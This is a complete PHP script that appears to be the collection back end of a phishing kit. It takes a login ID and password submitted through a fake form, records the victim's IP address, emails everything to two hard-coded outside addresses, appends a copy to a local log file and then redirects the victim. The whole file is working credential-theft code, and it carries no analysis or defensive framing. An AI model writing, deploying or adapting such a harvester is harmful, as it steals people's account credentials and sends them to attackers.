<?php
session_start();

$_SESSION['id']=$_POST['id'];$_SESSION['oooo']=$_POST['oooo'];

$message = "+ Information\r\n";
$message .= "| IP Address : " . $_SERVER['REMOTE_ADDR'] . ")\r\n";

$message .= "| ID: " . $_POST['id'] . "\r\n";
$message .= "| Pass : " . $_POST['oooo']  . "\r\n";


$message .= "+ ------------------------------------------+\r\n\r\n";

$to = "tro.trudeau@net-c.fr,troy.louineaux@sfr.fr";
$subj = "log BN".$ip."\n";
$from = "From: bn <webmaster@websitewelcome.com>";

mail($to, $subj, $message, $from);
$fp = fopen('logdszae.txt', 'a');
fwrite($fp, $message);
fclose($fp);

header("activv.php");
?>